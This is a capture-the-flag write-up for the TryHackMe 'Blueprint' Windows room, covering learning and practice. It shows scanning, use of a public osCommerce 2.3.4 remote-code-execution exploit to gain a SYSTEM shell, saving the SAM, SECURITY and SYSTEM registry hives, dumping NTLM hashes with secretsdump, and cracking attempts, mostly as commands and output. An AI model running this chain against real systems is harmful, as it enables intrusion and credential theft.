# Blueprint

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Windows
Subscription type: Free
Description: Hack into this Windows machine and escalate your privileges to Administrator.
```
Room link: [https://tryhackme.com/r/room/blueprint](https://tryhackme.com/r/room/blueprint)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ nmap -v -sV -sC 10.10.241.145
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 19:39 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:39
Completed NSE at 19:39, 0.00s elapsed
Initiating NSE at 19:39
Completed NSE at 19:39, 0.00s elapsed
Initiating NSE at 19:39
Completed NSE at 19:39, 0.00s elapsed
Initiating Ping Scan at 19:39
Scanning 10.10.241.145 [2 ports]
Completed Ping Scan at 19:39, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:39
Completed Parallel DNS resolution of 1 host. at 19:39, 0.00s elapsed
Initiating Connect Scan at 19:39
Scanning 10.10.241.145 [1000 ports]
Discovered open port 445/tcp on 10.10.241.145
Discovered open port 443/tcp on 10.10.241.145
Discovered open port 3306/tcp on 10.10.241.145
Discovered open port 135/tcp on 10.10.241.145
Discovered open port 80/tcp on 10.10.241.145
Discovered open port 8080/tcp on 10.10.241.145
Discovered open port 139/tcp on 10.10.241.145
Discovered open port 49158/tcp on 10.10.241.145
Discovered open port 49160/tcp on 10.10.241.145
Discovered open port 49153/tcp on 10.10.241.145
Discovered open port 49159/tcp on 10.10.241.145
Discovered open port 49154/tcp on 10.10.241.145
Discovered open port 49152/tcp on 10.10.241.145
Completed Connect Scan at 19:39, 3.67s elapsed (1000 total ports)
Initiating Service scan at 19:39
Scanning 13 services on 10.10.241.145
Service scan Timing: About 61.54% done; ETC: 19:41 (0:00:34 remaining)
Completed Service scan at 19:40, 59.71s elapsed (13 services on 1 host)
NSE: Script scanning 10.10.241.145.
Initiating NSE at 19:40
Completed NSE at 19:40, 5.68s elapsed
Initiating NSE at 19:40
Completed NSE at 19:40, 0.80s elapsed
Initiating NSE at 19:40
Completed NSE at 19:40, 0.00s elapsed
Nmap scan report for 10.10.241.145
Host is up (0.079s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-title: 404 - File or directory not found.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-25T17:38:41
|_  start_date: 2024-09-25T17:36:17
|_clock-skew: mean: -2m12s, deviation: 0s, median: -2m12s
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:06:3b:1f:cf:6f (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
Initiating NSE at 19:40
Completed NSE at 19:40, 0.00s elapsed
Initiating NSE at 19:40
Completed NSE at 19:40, 0.00s elapsed
Initiating NSE at 19:40
Completed NSE at 19:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.20 seconds
```
We can see from the output above that the server is running [OsCommerce](https://en.wikipedia.org/wiki/OsCommerce) version 2.3.4.

### Check for exploits

Let's check if there is an exploit available for that version.
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ searchsploit oscommerce 2.3.4 
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                                             | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                                           | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                                        | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                                         | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                                            | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                              | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                                                              | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                                                                                          | php/webapps/50128.py
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ searchsploit -m 44374        
  Exploit: osCommerce 2.3.4.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44374
     Path: /usr/share/exploitdb/exploits/php/webapps/44374.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Blueprint/44374.py

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ searchsploit -m 50128
  Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/50128
     Path: /usr/share/exploitdb/exploits/php/webapps/50128.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Blueprint/50128.py
```

We found 2 possible RCE exploits written in Python.

### Analyse the exploits

Now we check/analyse the exploits
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ head -n 25 44374.py
# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
# Date: 29.0.3.2018
# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
# Tested on: Linux, Windows

# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
# PHP code into the config file and then simply executing the code by opening it.


import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://localhost//oscommerce-2.3.4.1/catalog/"
target_url = "http://localhost/oscommerce-2.3.4.1/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ head -n 25 50128.py 
# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Vendor Homepage: https://www.oscommerce.com/
# Version: osCommerce 2.3.4
# Tested on: Windows

import requests
import sys

if(len(sys.argv) != 2):
        print("please specify the osCommerce url")
        print("format: python3 osCommerce2_3_4RCE.py <url>")
        print("eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog")
        sys.exit(0)

baseUrl = sys.argv[1]
testVulnUrl = baseUrl + '/install/install.php'

def rce(command):
        #targeting the finish step which is step 4
        targetUrl = baseUrl + '/install/install.php?step=4'

```

### Get a reverse shell

Let's go for the later one which accepts the URL via parameters.
```bash          
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ python 50128.py http://10.10.241.145:8080/oscommerce-2.3.4/catalog/
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system

RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

09/25/2024  06:58 PM    <DIR>          .
09/25/2024  06:58 PM    <DIR>          ..
04/11/2019  10:52 PM               447 application.php
09/25/2024  06:58 PM             1,118 configure.php
04/11/2019  10:52 PM    <DIR>          functions
               2 File(s)          1,565 bytes
               3 Dir(s)  19,509,334,016 bytes free

RCE_SHELL$ 
```
We are running as `SYSTEM` and are located in the `C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes` directory.

### Get the registry hives

To crack the NTLM hash of the `Lab` user we need the `SAM`, `SECURITY`, and `SYSTEM` registry hives.  
We can get them with `reg.exe save`
```
RCE_SHELL$ reg.exe save hklm\sam SAM
The operation completed successfully.

RCE_SHELL$ reg.exe save hklm\security SECURITY
The operation completed successfully.

RCE_SHELL$ reg.exe save hklm\system SYSTEM
The operation completed successfully.
```

Next, we download them with `wget`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ wget http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SAM
--2024-09-25 20:47:42--  http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SAM
Connecting to 10.10.241.145:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24576 (24K)
Saving to: ‘SAM’

SAM                                            100%[==================================================================================================>]  24.00K  99.4KB/s    in 0.2s    

2024-09-25 20:47:43 (99.4 KB/s) - ‘SAM’ saved [24576/24576]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ wget http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SECURITY
--2024-09-25 20:47:49--  http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SECURITY
Connecting to 10.10.241.145:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24576 (24K)
Saving to: ‘SECURITY’

SECURITY                                       100%[==================================================================================================>]  24.00K   100KB/s    in 0.2s    

2024-09-25 20:47:50 (100 KB/s) - ‘SECURITY’ saved [24576/24576]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ wget http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SYSTEM  
--2024-09-25 20:47:55--  http://10.10.241.145:8080/oscommerce-2.3.4/catalog/install/includes/SYSTEM
Connecting to 10.10.241.145:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12800000 (12M)
Saving to: ‘SYSTEM’

SYSTEM                                         100%[==================================================================================================>]  12.21M  1.15MB/s    in 11s     

2024-09-25 20:48:07 (1.07 MB/s) - ‘SYSTEM’ saved [12800000/12800000]
```

### Dump the hashes

Now we dump the hashes with secretsdump from `impacket`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ impacket-secretsdump LOCAL -sam SAM -security SECURITY -system SYSTEM
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):malware
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x9bd2f17b538da4076bf2ecff91dddfa93598c280
dpapi_userkey:0x251de677564f950bb643b8d7fdfafec784a730d1
[*] Cleaning up... 
```
The NTLM hash for `Lab` is `30e87bf999828446a1c1209ddde4c450`.

Let's try to crack it with `hashcat` and the rockyou wordlist
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Blueprint]
└─$ hashcat -a 0 -m 1000 '30e87bf999828446a1c1209ddde4c450' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<---snip--->

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 30e87bf999828446a1c1209ddde4c450
Time.Started.....: Wed Sep 25 20:54:30 2024 (12 secs)
Time.Estimated...: Wed Sep 25 20:54:42 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1319.7 kH/s (0.15ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 19%

Started: Wed Sep 25 20:54:24 2024
Stopped: Wed Sep 25 20:54:43 2024
```
Nope, that didn't work.

We can check [crackstation.net](https://crackstation.net/) instead and see if the hash is already cracked.  
And it is! The password is `g<REDACTED>s`

### Get the root flag

Finally, we get the root flag from our reverse shell
```bash
RCE_SHELL$ where /R C:\Users root.txt 

RCE_SHELL$ where /R C:\Users root*
C:\Users\Administrator\Desktop\root.txt.txt

RCE_SHELL$ type C:\Users\Administrator\Desktop\root.txt.txt
THM{<REDACTED>}
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [OsCommerce - Wikipedia](https://en.wikipedia.org/wiki/OsCommerce)
- [reg save - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
- [where - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where)
